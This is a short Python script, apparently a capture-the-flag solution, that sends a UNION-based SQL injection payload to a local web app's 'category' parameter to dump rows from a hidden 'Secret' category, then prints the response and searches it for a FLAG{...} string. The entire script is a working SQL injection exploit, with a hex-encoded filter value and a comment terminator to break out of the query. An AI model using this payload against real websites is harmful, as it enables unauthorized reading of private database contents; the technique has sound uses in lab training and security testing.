import urllib.parse

# Build the payload
payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"
encoded = urllib.parse.quote(payload, safe='')
url = f"http://127.0.0.1:33130/?category={encoded}"

print(f"[*] URL: {url}")
print(f"[*] Payload: {payload}")
print("\n[*] Making request...")

# Use urllib to avoid requests dependency issues
try:
    import urllib.request
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=10) as response:
        content = response.read().decode('utf-8')
        print(f"\n[+] Status: {response.status}")
        print(f"[+] Content Length: {len(content)}")
        print("\n[+] Response:")
        print("=" * 80)
        print(content)
        print("=" * 80)
        
        # Check for Secret
        if "Secret" in content:
            print("\n[✓] Found 'Secret' category in response")
        else:
            print("\n[-] 'Secret' not found in response")
            
        # Check for flag
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', content)
        if flags:
            print(f"\n[!!!] FLAG FOUND: {flags[0]}")
        else:
            print("\n[-] No flag found")
            
except Exception as e:
    print(f"\n[!] Error: {e}")
    import traceback
    traceback.print_exc()
